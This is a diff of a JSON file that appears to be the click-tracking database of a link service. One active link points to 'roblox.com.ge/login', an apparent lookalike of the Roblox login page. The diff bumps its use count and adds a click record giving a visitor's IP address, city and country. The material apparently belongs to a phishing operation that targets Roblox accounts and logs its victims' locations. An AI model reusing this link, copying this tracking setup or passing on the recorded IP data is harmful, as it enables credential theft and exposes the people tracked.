@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 986,
+    "useCount": 987,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8003,6 +8003,14 @@
       },
       {
         "timestamp": 1777218945669,
+        "ip": "49.144.212.246",
+        "country": "Philippines",
+        "city": "Santa Rosa",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777219027829,
         "ip": "49.144.212.246",
         "country": "Philippines",
         "city": "Santa Rosa",
